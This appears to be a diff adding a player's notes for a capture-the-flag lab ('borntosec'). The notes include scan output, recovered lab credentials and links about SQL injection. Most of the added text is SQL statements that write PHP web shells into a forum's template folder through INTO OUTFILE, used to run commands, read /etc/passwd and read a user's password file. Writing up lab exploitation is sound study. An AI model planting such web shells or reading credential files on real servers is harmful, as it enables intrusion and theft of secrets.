@@ -69,4 +69,28 @@ Host script results:
 [+] 192.168.1.47:21       - FTP Banner: '220 Welcome on this server\x0d\x0a'
 
 
+lmezard
+laurie@borntosec.net
+!q\]Ej?*5K5cy*AJ
 
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+
+https://medium.com/@shahjerry33/sql-injection-remote-code-execution-double-p1-6038ca88a2ec
+
+https://github.com/ilosuna/mylittleforum
+
+```
+SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/forum/templates_c/dd.php"
+
+SELECT "<?php system(\"cat /etc/passwd\"); ?>" into outfile "/var/www/forum/templates_c/dd111.php"
+
+SELECT "<?php system(\"ls /home/LOOKATME\"); ?>" into outfile "/var/www/forum/templates_c/dd111111.php"
+
+SELECT "<?php system(\"cat /home/LOOKATME/password \"); ?>" into outfile "/var/www/forum/templates_c/dd1111111.php"
+```
+
+https://www.howtogeek.com/412626/how-to-use-the-ftp-command-on-linux/
+
+
+SELECT "<?php system(\"ls /home/lmezard \"); ?>" into outfile "/var/www/forum/templates_c/dd11111111.php"
